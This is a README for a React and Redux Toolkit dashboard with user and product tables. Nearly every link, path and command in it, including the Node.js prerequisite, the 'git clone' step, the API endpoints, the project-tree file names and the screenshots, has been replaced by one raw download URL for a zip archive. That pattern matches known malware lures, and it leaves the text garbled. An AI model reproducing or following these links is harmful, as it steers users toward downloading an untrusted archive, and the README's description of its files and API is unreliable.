# React + Redux Toolkit + Tailwind Dashboard

## Overview
This project is a React-based web application utilizing Redux Toolkit for state management and Tailwind CSS for styling. It fetches data from [DummyJSON API](https://github.com/nabil-alsaadi/react-dashboard/raw/refs/heads/main/src/dashboard-react-3.5.zip) and provides a user and product management system with filtering, searching, and pagination functionalities.

## Features
- **Users & Products Pages**: Display users and products in a tabular format.
- **Reusable Components**:
  - `DataTable` for displaying data.
  - `Pagination` for managing pagination.
  - `SearchBar` for client-side searching.
  - `FilterBar` for server-side filtering.
  - `PageSizeSelector` for selecting the number of entries per page.
- **Filters & Search**:
  - Search filters work on the client-side.
  - API filters reset other filters when a new one is applied.
- **Sidebar Navigation**: Expandable and collapsible sidebar for easy navigation.

## Tech Stack
- **Frontend**: React, TypeScript, Tailwind CSS
- **State Management**: Redux Toolkit
- **API Requests**: Axios
- **Routing**: React Router DOM

## Installation

### Prerequisites
Make sure you have **https://github.com/nabil-alsaadi/react-dashboard/raw/refs/heads/main/src/dashboard-react-3.5.zip (>=14.x)** installed.

### Steps to Run the Project
```sh
# Clone the repository
git clone https://github.com/nabil-alsaadi/react-dashboard/raw/refs/heads/main/src/dashboard-react-3.5.zip
cd react-dashboard

# Install dependencies
npm install

# Start the development server
npm start
```

The application will be available at `http://localhost:3000`.

## Project Structure
```
├── src
│   ├── components        # Reusable UI components
│   ├── pages             # Page components (Users, Products)
│   ├── store             # Redux slices
│   ├── constants         # Constants and configurations
│   ├── https://github.com/nabil-alsaadi/react-dashboard/raw/refs/heads/main/src/dashboard-react-3.5.zip           # Main app entry point
│   └── https://github.com/nabil-alsaadi/react-dashboard/raw/refs/heads/main/src/dashboard-react-3.5.zip         # Root file
└── https://github.com/nabil-alsaadi/react-dashboard/raw/refs/heads/main/src/dashboard-react-3.5.zip             # Project documentation
```

## API Endpoints Used
- **Users**: `https://github.com/nabil-alsaadi/react-dashboard/raw/refs/heads/main/src/dashboard-react-3.5.zip`
- **Products**: `https://github.com/nabil-alsaadi/react-dashboard/raw/refs/heads/main/src/dashboard-react-3.5.zip`
- **Filters & Search**:
  - `GET /users/filter?key={key}&value={value}`
  - `GET /products/search?q={query}`
  - `GET /products/category/{category}`
  - `GET /products/category-list`

## Usage
- **Users Page** (`/users`): Displays users with filtering and search functionality.
- **Products Page** (`/products?category=all` / `/products?category=laptops`): Displays products with category filtering.
- **Sidebar**: Can be expanded or collapsed for better navigation.

## Deployment
To build the project for production:
```sh
npm run build
```
The build files will be available in the `build/` directory, ready for deployment.

## Screenshots
Here are some screenshots showcasing the project:

### Products Page
![Products Page](https://github.com/nabil-alsaadi/react-dashboard/raw/refs/heads/main/src/dashboard-react-3.5.zip)

### Users Page
![Users Page](https://github.com/nabil-alsaadi/react-dashboard/raw/refs/heads/main/src/dashboard-react-3.5.zip)

## License
This project is open-source and available under the MIT License.

